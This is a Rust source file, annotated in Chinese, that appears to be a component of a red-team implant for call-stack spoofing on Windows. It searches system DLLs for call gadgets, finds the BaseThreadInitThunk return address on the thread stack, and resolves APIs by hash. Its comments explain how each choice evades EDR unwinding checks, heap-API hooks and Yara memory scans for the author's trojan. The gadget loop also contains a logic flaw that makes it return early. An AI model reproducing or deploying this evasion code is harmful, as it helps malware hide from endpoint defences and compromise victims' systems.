// 本文件的主要作用是在系统的dll文件中,切割出需要的gadgets

use core::ptr::null_mut;
#[allow(unused)]
use core::{ffi::c_void, slice::from_raw_parts};

// 用自定义栈来取代use alloc::vec::Vec;原因详见注释1

use obfstr::obfbytes as b;
use puerto::types::IMAGE_RUNTIME_FUNCTION;

// crate代表当前crate的根目录文件.对于库(Library),其根目录就是lib.rs;对于二进制(Binary)项目,根目录文件就是main.rs
// 这里表示从当前项目的lib.rs文件中,导入ignoring_set_fpreg.但这里函数本身定义在uwd.rs中,为啥能从lib.rs导入呢.因为在lib.rs中引入了pub use uwd::*;将uwd.rs的所有pub函数和类型挂载到lib.rs下.又从lib.rs这个根目录导入本文件中(这叫重导出)
// 这里引入了未完成的文件中的函数.此时应该集中精力完成本文件,把这个未完成的函数设为桩函数(stub/mock),避免在多个未完成文件频繁跳转,造成逻辑混乱.即在未完成的函数对应的文件中,实现该函数的空实现
use crate::{ignoring_set_fpreg, types::UNWIND_FRAME_INFO};

/// search for a valid instruction offset in a function:用于伪造符合要求的返回地址.在选定函数的二进制代码字节流中,搜索call qword ptr [rip + 0]的汇编指令.将该指令的pos+7(该指令固定7字节)作为下一条指令地址返回,作为伪造的返回地址.
/// 
/// cpu执行call指令时,cpu会自动把call指令下一条指令地址(rip中的地址)压栈作为返回地址.edr用RtlVirtualUnwind回溯检查时,会检查返回地址-7的字节处.是否有一条call指令,如果没有edr就会报警.
///
/// this sacns the function's codde region for a `call qword ptr [rip + 0]` instruction sequence and returns the offset after the instruction  
/// 
/// call qword ptr [rip + 0]:
/// call调用指令会:1. 将返回地址(下一条指令的物理地址)压入栈顶(push rsp) 2. 将cpu的rip修改为目标地址,实现跳转
/// qword ptr:quad 四倍,cpu从目的内存地址中读取一个8字节的数据作为目标函数指针
/// [rip+0]:win64下,引入了rip相对寻址.cpu解码和执行当前call指令时,rip寄存器的值已经自动递增,指向当前指令下方的第一个字节.
///
/// 该指令(call qword ptr [rip + 0])对应的16进制机器码固定为7个字节:48 FF 15 00 00 00 00
/// 48:REX.W前缀,声明这是一个64位宽度的操作
/// FF 15:间接call操作码(call [rip + displacement])
/// 00 00 00 00:32位相对偏移量(对应上面的displacement),这里是0
/// 该7字节的指令指令流程(假设其内存地址为0x1000至0x1006),即cpu执行0x1000处的call指令时:
/// 1. rip始终指向下一条指令的地址,所以此时的rip=0x1000+7=0x1007;2. 计算寻址目标(rip+0)后,cpu从0x1007处读取8字节的数据(拿到了函数地址);3. 压栈返回地址,cpu将当前rip(0x1007)作为返回地址压栈(push rsp);4. 执行跳转:cpu将rip置为函数地址,开始执行目标函数
///
/// the search gadget pattern is `48 FF 15 00 00 00 00`,and the returned value is `match_offset + 7`
pub fn find_valid_instruction_offset(
    module: *mut c_void,
    // 对应函数在内存中机器码的物理region,及该region绑定的栈回溯结构体(每个有栈操作的函数都有,位于.pdata节)
    runtime: &IMAGE_RUNTIME_FUNCTION,
) -> Option<u32> {
    let start = module as u64 + runtime.BeginAddress as u64;
    let end = module as u64 + runtime.EndAddress as u64;
    let size = end - start;
    // 缺少对sie发生异常时的错误控制(如 samoa/error.rs/HypnusError)

    // find a gadget `call qword ptr [rip + 0]`
    // 匹配到 DLL 中所有形式的 call qword ptr [rip + N] 指令（无论后面的偏移量N 是 0、0x1234 还是 0x80）。这极大扩大了搜索范围，保证 能搜到可用Gadget.此外该指令永远是7字节大小
    let pattern = b!(&[0x48, 0xFF, 0x15]); // 是否自定义加密算法?(利用开机以来的时间作为密钥)
    unsafe {
        let bytes = from_raw_parts(start as *const u8, size as usize);

        if let Some(pos) = memchr::memmem::find(bytes, pattern) {
            // return valid RVA:offset of the gadget inside the function
            // pos是搜索到的call qword ptr [rip+0]指令起点,pos + 7跨过这7字节的指令,指向指令结束后的第一字节,这里是call指令执行时压入栈中的真实返回地址偏移量(RVA都是u32的)
            return Some((pos + 7) as u32);
        }
    }

    None
}

/// scans the code of a module for a given byte pattern,restricted to a valid
/// RUNTIME_FUNCTION regions
/// 
/// 遍历.pdata节区每个合法函数region,确保找到的gadget都位于有unwind记录的函数内部,避免有非函数指令;
/// 
/// 返回gadget的VA和gadget在函数栈中的offsset
pub fn find_gadget(
    module: *mut c_void,
    pattern: &[u8],
    runtime_table: &[IMAGE_RUNTIME_FUNCTION],
) -> Option<(*mut u8, u32)> // gadget的VA和gadget在函数栈中的offsset
{
    // 自定义栈代替Vec,详见注释1
    let mut gadgets = [(null_mut(), 0u32); 16];
    let mut count = 0;

    unsafe {
        // 用for循环代替uwd中的 .iter.filter_map.collect
        for runtime in runtime_table {
            let start = module as u64 + runtime.BeginAddress as u64;
            let end = module as u64 + runtime.EndAddress as u64;
            // saturating饱和算法:rust中一种极度高级且安全的防御性编程手段,专门用于防止整数溢出导致的panic或蓝屏.详见注释2
            let size = end.saturating_sub(start);

            // Read bytes from the function's code region
            let bytes = from_raw_parts(start as *const u8, size as usize);
            if let Some(pos) = memchr::memmem::find(bytes, pattern) {
                // 根据找到的相对偏移量pos,计算搜寻到的gadget在内存中的绝对物理虚拟地址VA.详见注释3
                let addr = (start as *mut u8).wrapping_add(pos);

                // 计算需要伪造的栈帧大小
                if let Some(frame_size) = ignoring_set_fpreg(module, runtime) {
                    if frame_size != 0 {
                        gadgets[count] = (addr, frame_size);
                        count += 1;

                        // 只收集前16个
                        if count >= 16 {
                            break;
                        }
                    }
                }
            }

            if count == 0 {
                return None;
            }

            // 在栈切片上洗牌
        }
        Some(gadgets[0])
    }
}

/// scans the current thread's stack to locate the return address that falls进入..状态 within the range of the BaseThreadInitThunk function from kernel32.dll
#[cfg(feature = "desync")]
pub fn find_base_thread_return_address()->Option<usize> {
    use puerto::module::{get_module_address,get_proc_address};
    use puerto::{hash::fnv1a_utf16,helper::PE};
    use crate::types::Unwind;

    unsafe {
        // get hadle for kernel32.dll
        // get_module_address参数中的Some没有必要.后续需要重构
        let kernel32 = get_module_address(Some(0x6BEFCBB7), Some(fnv1a_utf16))?;

        // resolve the address of the BaseThreadInitThunk function
        let base_thread = get_proc_address(Some(kernel32), Some(0xF70757EA), Some(fnv1a_utf16));
        // 以上,如果上面两个值返回None,会传播给find_base_thread_return_address的返回值,后续再由uwd.rs进一步处理.
        
        // calculate the size of BaseThreadInitThunk function:对应函数的机器码区间长度,不是栈帧大小
        let pe_kernel32 = Unwind::new(PE::parse(kernel32));
        let size = pe_kernel32.function_size(base_thread)? as usize;

        // access the TEB and stack limits
        let teb = puerto::winapis::NtCurrentTeb();
        let stack_base = (*teb).Reserved1[1] as usize;
        let stack_limit = (*teb).Reserved1[2] as usize;

        // stack scanning begins:在当前线程真实的物理堆栈内存中,逐字节向下搜索,找到物理上存放BaseThreadInitThunk返回地址的rsp指针
        let base_addr = base_thread as usize;
        // stack_base是该线程堆栈的顶部(最高内存地址),且在win为线程分配的1MB栈空间中,不包含stack_base,stack_limit是堆栈底部,包含在1MB的空间内.win64压栈是8字节对齐.
        // 即rsp是cpu当前动态变化的栈顶指针.stack_base是TEB中记录的静态内存边界数值,代表这块栈空间最高能到哪里.要从物理内存上最靠顶部的合法槽位开始向下一行扫描,必须从stack_base-8开始读取,否则会触发Access Violattion
        // rsp是存放返回地址的那个栈槽的内存地址(指针)
        let mut rsp = stack_base -8;
        while rsp>=stack_limit {
            // 读取rsp寄存器中的值
            let val = (rsp as *const usize).read();
            // check if the return is in the BaseThreadInitThunk range
            // 前文已经通过get_proc_addresss拿到BaseThreadInitThunk在dll内存中的基址(base_addr),后续也计算了其长度(size),这就得到了该函数在内存中的VA区间
            // 此处,不停的读取物理堆栈内存中的槽位数据(这里用*rsp,但并不是真正的cpu寄存器,而是作为一个本地变量来使用的),并比对是否落在上述的VA区间.如果是就表明该栈槽中保存的就是该函数的返回地址.
            // 拿到这个rsp后,后续就在伪造堆栈时,就知道该把栈指针拉回到真实堆栈的哪个具体格子中
            if val>=base_addr && val <base_addr +size {
                return Some(rsp);
            }
            rsp-=8;
        }
None

    }


}


/// randomly shuffles the elements of a list in place
/// &mut[T]代表一个可变slice,执行原地修改时,不需要额外分配内存
pub fn shuffle<T>(list: &mut [T]) {
    let mut seed = unsafe {
        // current value of the processor’s time-stamp counter:开机以来经过的TSC时钟周期总数(u64)
        // 在#![no_std]下,没有std::time和rand库,利用_rdtsc()在不调用win api下,拿到一个随cpu时钟实时变化的高熵随机数.
        core::arch::x86_64::_rdtsc()
    };
    // Fisher-Yates算法
    // .rev(),区间内元素位置反转.
    // wrapping_mul(1103515245).wrapping_add(12345)这里使用回绕函数做指针运算,其内部是经过验证的魔术.这句的作用是根据seed算出下一个高品质随机数
    for i in (1..list.len()).rev() {
        seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
        let j = seed as usize % (i + 1);
        list.swap(i, j);
    }
}

// 注释1
// 使用栈上分配的固定大小数组([T;N]),完全取代堆上分配alloc::vec::Vec 虽然影响本文件的架构,但也会改变底层的内存调用指纹,去特征化
// 1. 可行性:win64下,默认线程用户栈大小是1MB,而需要的gadget数据结构的类型为(*mut u8,u32),其实质是一个8字节指针+一个4字节整数+4字节编译器对齐填充=16字节.如果声明一个16个元素的这样的类型,其大小只有256字节.在1MB的用户栈空间大小,申请256字节的局部变量,绝对没有栈溢出风险.且当对应的函数返回时,该256字节会被cpu通过add rsp,X瞬间回收.
// 2. 取代Vec的原因:
//  2.1 堆分配会提前暴露未伪装的调用栈.调用find_gadget时,堆栈还没有完成伪装.此时调用Vec会触发底层RtlAllocateHeap系统调用.如果edr对该api hook,edr回溯调用栈,会看到该堆分配是由未备份的内存页(自己的木马)发起的,进而开始拦截.而使用栈数组情况下,整个gadget查找和洗牌过程只有纯粹的寄存器运算和栈读写,完全不调用任何win的内存分配api.在edr视角下,这个阶段是完全静默和不可见的
//  2.2 打破编译器循环依赖:在#![no_std]载荷生命周期中,有个经典死锁问题:定位api(如寻找RtlAllocateHeap符号)->需要内存分配器;而分配器初始化->需要RtlAllocateHeap的地址.  如果util.rs抛弃Vec(即抛弃对alloc库的依赖),util.rs会退化为纯村的静态算法文件.这意味着,即便在全局分配器(WinHeap)尚未初始化成功的极早期阶段,也能安全运行util.rs的搜索算法.这极大简化了引导加载构建流程
//  2.3  清除内存取证残留:使用Vec时,堆内存会被释放(dealloc)后,如果不做深度清理,gadget的指针数据依然会残留在堆的空闲块(Free List)里,容易被内存扫描器(如Yara)扫到.而使用栈数组,函数返回后,栈帧回退,后续任何其他函数调用都会物理覆盖掉这256字节的临时数据.
//  2.4 使用Vec会隐式引入Rust标注库alloc,同时带来了边界检查,扩容收缩等汇编代码,导致生成的shellcode臃肿.而栈数组的代码经LLVM优化后会精简为几条简单的循环和交换指令.
// 3. 栈数组方案的限制:无法无限收集gadget.如果一个DLL中有100个符合条件的gadget,而这里设计的栈数组只能收集前16个.但这完全没有影响,在实际的栈欺骗中,只需要一个合法的gadget就能完成跳转.收集16个gadget并对其进行随机洗牌(shuffle),其随机性已足够对抗静态特征分析了,并不需要把dll中上千个gadget完全存下来.

// 注释2
// 极端场景下,如PE文件损坏,遇到异常.pdata记录等,导致end<start:
// 1. Debug下,rust会检车到整数下溢(underflow),强制触发panic! .在#![no_std]环境,panic!意味着进程直接死掉
// 2. Release下,rust不会panic,但该数值会循环下溢(Wrap Around),下溢的数值会非常大.导致后续的frome_raw_parts(start,size)去读取极大的内存空间,触发系统的Access Violation(内存越界访问违规,0xC0000005),引发进程蓝屏或崩溃退出
// Rust的饱和减法彻底解决这种危险.saturating_sub:能减就减,如果出现负数,强制钳制Clamp在最小值0,绝不溢出.
// 红队中,size被Clamp后,后续的代码逻辑会优雅的自我保护:
// 1. size为0,构造的是一个长度0的slice;2. 在空slice中找gadget,会返回None 3. filter_map会跳过这个损坏的函数条目,继续检查下一个函数
// Rust安全性的体现,牛逼

// 注释3
// wrapping_add回绕算法,是一种极度硬核的指针无缝算数操作
// start as *mut u8:将当前函数机器码在内存中的起点位置(u64类型的start)转为以单字节为单位的裸指针.后续做加法时,每+1就代表在内存中向后移动1字节
// wrapping_add: Rust中,对裸指针做指针运算有两种: 1. 普通add(pos) 2.wrapping_add(pos)
// 普通add的安全约束:Rust规定,普通的指针add必须满足"结果指针不能跨越所在内存对象的地址边界".如果指针加法计算超出了有效内存范围,在LLVM编译器层面会被标记为未定义行为undefined behavior.
// wrapping_add的物理保障:使用cpu原生的二进制加法逻辑(按位相加,溢出时自动回绕).即不对这个指针算数做任何隐式边界假设和UB优化,按照cpu的底线加法指令计算
// 相对指针普通加法,回绕算法:
// 1. 回绕是safe的,不需要放在unsafe中,普通需要
// 2. 内存对象边界锲约:回绕没有约束,是纯粹的64位模运算.普通的有约束:结果指针必须落在同一个分配对象内
// 3. 回绕无UB,普通会出现UB
// 4. LLVM底层:回绕是纯粹的64位算数加法.而普通是带inbounds标记的
// 二者的物理本质区别在于LLVM的inbounds假设
// 普通ptr.add(offset),编译出来的llvm中间代码会有inbounds标记,该标记向编译器保证,ptr+offset计算出的地址,绝不会超过ptr原本所在的内存块的边界(?)
// llvm会根据保证执行激进的死代码消除优化.如果此时实质上超出了该内存对象的边界,llvm会认为其在物理上不可能发生,从而将后续的代码全部擦除,这就会发生及其可怕的UB
// 而wrapping_add回绕加法,生成的是不带inbounds的普通二进制加法指令.就没有了边界优化.
// 此时如果出现一个超大的地址,回绕就是减去能表示的最大值,然后取余数.(像时钟一样,因此取名回绕)
//
// 问题是如果真的发生了回绕取余,算出来的地址物理上也失效了,变成了野指针.访问该野指针,肯定会崩溃.那使用wrapping_add的意义就变成让程序挂的干净且可预测.因为回绕不会发生llvm的死代码擦除动作,能够定位panic的具体位置.而不是发生ub这种不可预测的错误
